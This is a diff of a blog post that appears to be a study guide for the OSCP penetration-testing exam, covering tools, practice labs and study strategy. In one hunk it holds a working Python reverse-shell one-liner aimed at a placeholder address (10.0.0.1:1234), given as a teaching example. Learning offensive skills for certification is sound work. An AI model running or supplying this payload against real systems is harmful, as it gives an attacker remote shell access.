@@ -18,7 +18,11 @@ tags:
 
 
 
-Those who know me personally will know that  I prepared extensively for the PWK course, and consequently the OSCP exam. And one common question from my peers is "How do I go about preparing for the OSCP? Where do I start?". If you look on the internet, there are several good guides on how to go about doing it, but here I am, adding to another of that list of guides.
+Those who know me personally will know that  I prepared extensively for the PWK course, and consequently the OSCP exam. I think I did well, but in all honestly, I overkilled in my preparation. There were a lot of things I dived deeper into than required; maybe out of paranoia of failure, or perhaps it was just curiosity and me wanting to learn more.
+
+
+
+One common question from my peers is "How do I go about preparing for the OSCP? Where do I start?". If you look on the internet, there are several good guides on how to go about doing it, but here I am, adding to another of that list of guides.
 
 
 
@@ -43,7 +47,7 @@ I don't want to dump 50 links on you for reading, with each of them having their
 
 
 
-Ff you just want to prepare yourself sufficiently for the OSCP, this guide is for you. Do note that this will **NOT** make you a good penetration tester. Many real world scenarios and test cases performed in a penetration test are not tested in the exam. The OSCP is a **beginner** certification(albeit a difficult one) which teaches you the basic methodology and mindset of a hacker.
+If you just want to prepare yourself sufficiently for the OSCP, this guide is for you. Do note that this will **NOT** make you a good penetration tester. Many real world scenarios and test cases performed in a penetration test are not tested in the exam. The OSCP is a **beginner** certification(albeit a difficult one) which teaches you the basic methodology and mindset of a hacker.
 
 
 
@@ -54,8 +58,6 @@ That being said, if you want to be truly good at it, and not just a walking cert
 
 
 ## 1. Knowing your weapons
-
-
 
 ### 1.1 The Kali Linux Operating System
 
@@ -80,7 +82,7 @@ That black screen with white(or green) words. Get used to using it; while some p
 What you need to know:
 
 1. **Moving around, manipulating files and directories in linux and windows**(cd, ls, dir, mkdir, rm, cp, cat etc) - This should take you less than an hour max. I'd even go as far as to say 10 minutes. If you can't remember them all, don't worry. Over time as you use them, you will remember.
-2. **Editing files** - I personally use Nano because it's the closest to a basic notepad. You can use Vi or Vim if you want to look more pro, but to hell with that. With Nano all you need is `ctrl + x` to exit, then press `y` to save.
+2. **Editing files** - I personally use Nano because it's the closest to a basic notepad. You can use Vi or Vim if you want to look like a 31337 h4x0r, but to hell with that. With Nano all you need is `ctrl + x` to exit, then press `y` to save.
 
 
 
@@ -120,7 +122,7 @@ How do you think you can change the IP address and port number you want the reve
 
 
 
-~~~bash
+~~~python
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ~~~
 
@@ -136,7 +138,7 @@ Yes that sort of basic. Some are harder than this but it's not too far off.
 
 
 
-I haven't really studied this much as I came into it with some experience, but I'm told this is a good resource:
+I haven't really studied this much as I came into it with some experience, but I'm told this is a good resource for learning the basics of the linux command line:
 
 [Overthewire: Bandit][1]
 
@@ -154,10 +156,10 @@ A lot of people may disagree with this approach, but it's still a valid strategy
 
 
 
-It's basically depth before breadth, vs breadth before depth:
+It's basically depth before breadth, vs breadth before depth. Take for example:
 
-1. You focus so deeply on something, for example web application exploitation. You run your port scan and 10 ports show up. 2 of these open ports are web applications. Try as you might, you can't find anything to leverage on in them, now what? You google for how to exploit each and every port.
-2. You have a rough idea of what techniques can be used on each port. **21** is open? Let's try anonymous login. **80**? Gotcha, `dirbuster`, `gobuster`, or `nikto`. You find a field that I know is vulnerable to SQL injection, but can't seem to get it right.  But at least you have something to work with and know what to Google for.
+1. You focus so deeply on something, for example web application exploitation, but that's about all you know. You run your port scan and 10 ports show up. 2 of these open ports are web applications. Try as you might, you can't find anything to leverage on in them, now what? You google for how to exploit each and every port. That's 8 different services running on the remaining 8 ports.
+2. You have a rough idea of what techniques can be used on each port. *21* is open? Let's try anonymous login. *80*? Gotcha, `dirbuster`, `gobuster`, or `nikto`. You find a field that I know is vulnerable to SQL injection, but can't seem to get it right.  But at least you have something to work with and know what to Google for.
 
 
 
@@ -171,7 +173,7 @@ If you able to purchase a [HackTheBox ][4]VIP subscription to access those machi
 
 
 
-For the machines from [Vulnhub][5], you can google the walkthroughs for them.
+For the machines from [Vulnhub][5], you can google the walkthroughs for them. Unlike HackTheBox, this is an entirely free approach. Do note you'll have  to set up your network between virtual machines. Also please do not connect the vulnerable machine to the internet.
 
 
 
@@ -187,10 +189,17 @@ Ok I get it, not everyone is able to absorb tidbits from all over the place at o
 
 
 
+There are many other fantastic free resources out there, but trust me on this one; just watch Ippsec.
+
+
+
 ### 2.3 The PWK lab
 
+At some point you will be ready to start the PWK course. Perhaps after going through most of the list of boxes on HackTheBox. mentioned before. If you got a VIP subscription and managed to get your hands dirty, all the better.
 
-At this point you are ready to start the PWK course. Depending on your confidence level, you can opt for 30, 60, or 90 days of labs. 90 is recommended for most. But if you have time to spare every day and are confident of rooting medium difficulty HackTheBox machines on your own, then you will probably get away with less.
+
+
+Depending on your confidence level, you can opt for 30, 60, or 90 days of labs. 90 is recommended for most. But if you have time to spare every day and are confident of rooting medium difficulty HackTheBox machines on your own, then you will probably get away with less.
 
 
 
@@ -199,8 +208,6 @@ From what I gather, a good number to aim for to get a feel of the general proces
 ---
 
 ## 3. A little bit on techniques
-
-
 
 ### 3.1 Buffer Overflows
 
